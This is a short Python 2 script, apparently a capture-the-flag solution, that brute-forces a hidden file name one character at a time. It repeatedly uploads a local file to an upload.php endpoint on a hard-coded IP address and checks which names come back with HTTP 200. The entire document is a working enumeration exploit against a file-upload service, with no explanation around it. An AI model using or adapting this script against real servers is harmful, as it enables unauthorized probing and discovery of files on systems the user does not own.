#encoding:UTF-8
import requests
def getz():
    flagName=''
    allstr="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    for i in range(100):
        for s in allstr:
            url='http://54.223.145.113:88/upload.php'
            tmpName=flagName+s
            files={'file':(tmpName,open("/Users/linallen/Desktop/1.txt",'rb'),'text/plain',{'Expires':'0'})}
            r=requests.post(url,files=files)
            file_url='http://54.223.145.113:88/upload/'+tmpName
            resp=requests.get(file_url)
            if resp.status_code==200:
                flagName = flagName +allstr[allstr.index(s)-1]
                print flagName
                break
if __name__=="__main__":
    getz()
